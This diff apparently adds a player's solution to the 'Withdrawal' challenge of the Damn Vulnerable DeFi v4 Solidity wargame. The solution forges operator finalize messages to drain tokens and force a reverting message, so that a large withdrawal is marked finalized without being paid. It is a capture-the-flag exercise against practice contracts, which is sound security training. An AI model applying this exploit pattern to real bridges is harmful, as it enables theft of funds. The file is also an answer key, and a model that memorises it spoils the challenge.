@@ -2,7 +2,7 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test} from "forge-std/Test.sol";
 import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
 import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
 import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
@@ -89,7 +89,60 @@ contract WithdrawalChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_withdrawal() public checkSolvedByPlayer {
-        
+        // Strategy:
+        // 1) As operator, submit a FAKE finalize that drains ~1500 DVT to
+        //    a junk address — this brings totalDeposits below 999,000 DVT.
+        // 2) Submit another FAKE finalize whose inner message is EXACTLY
+        //    W2's (executeTokenWithdrawal(0xea475..., 999_000e18)). The
+        //    TokenBridge call reverts on underflow (totalDeposits < amount),
+        //    and L1Forwarder records failedMessages[W2_messageId] = true.
+        // 3) Finalize W0, W1, W3 normally (30 DVT drained to their recipients).
+        // 4) Finalize W2 → Forwarder's `require(!failedMessages[W2_id])`
+        //    fails → revert → Gateway's assembly call reports success=false,
+        //    but `finalizedWithdrawals[W2_leaf] = true` already happened
+        //    before the call. TokenBridge was NOT called — no 999k drain.
+        //
+        // Final: bridge loses 1530 DVT < 1% → retained > 99%. All 4 leaves
+        // finalized. counter ≥ 4.
+
+        vm.warp(START_TIMESTAMP + 8 days);
+
+        // (1) Drain 1500 DVT via fake finalize to bring totalDeposits < 999,000e18
+        _finalizeOuter(100, 0x66729b63,
+            _buildMessage(100, address(0xDEAD), 1500e18));
+
+        // (2) Fake finalize with W2's EXACT inner message → TokenBridge underflow
+        //     → failedMessages[W2_messageId] = true
+        _finalizeOuter(101, 0x66729b63,
+            _buildMessage(2, 0xea475d60c118d7058beF4bDd9c32bA51139a74e0, 999_000e18));
+
+        // (3) Finalize W0, W1, W3 legitimately (each 10 DVT)
+        _finalizeOuter(0, 0x66729b63,
+            _buildMessage(0, 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6, 10e18));
+
+        _finalizeOuter(1, 0x66729b95,
+            _buildMessage(1, 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e, 10e18));
+
+        _finalizeOuter(3, 0x66729c37,
+            _buildMessage(3, 0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, 10e18));
+
+        // (4) Submit W2 — Forwarder reverts because failedMessages[W2_id] is true,
+        //     but the leaf is finalized in the gateway
+        _finalizeOuter(2, 0x66729bea,
+            _buildMessage(2, 0xea475d60c118d7058beF4bDd9c32bA51139a74e0, 999_000e18));
+    }
+
+    function _finalizeOuter(uint256 outerNonce, uint256 timestamp, bytes memory message) internal {
+        bytes32[] memory empty;
+        l1Gateway.finalizeWithdrawal(outerNonce, l2Handler, address(l1Forwarder), timestamp, message, empty);
+    }
+
+    function _buildMessage(uint256 nonce, address user, uint256 amount) internal view returns (bytes memory) {
+        bytes memory innerMessage = abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", user, amount);
+        return abi.encodeWithSignature(
+            "forwardMessage(uint256,address,address,bytes)",
+            nonce, user, address(l1TokenBridge), innerMessage
+        );
     }
 
     /**
